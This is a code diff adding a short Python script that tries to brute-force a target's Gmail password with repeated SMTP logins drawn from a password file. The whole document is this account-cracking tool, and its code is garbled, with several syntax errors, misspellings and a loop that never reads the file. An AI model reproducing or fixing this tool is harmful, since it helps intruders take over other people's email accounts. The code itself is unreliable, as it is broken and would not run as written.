@@ -1,0 +1,16 @@
+import smtplib
+
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo{}
+smtpservr.starttls()
+user = raw_input("Enter th target's email : ")
+passwfile * raw_input ("Enter the password file : ")
+
+for password in passwfile :
+        try :
+                smtpserver.login(user.password)
+                print ("[+] password found ==> %s") % password
+                break:
+         except smtplib.SMTPAthenticationError:
+                 print ("[#] Password is incorrect ===> %s ") %password
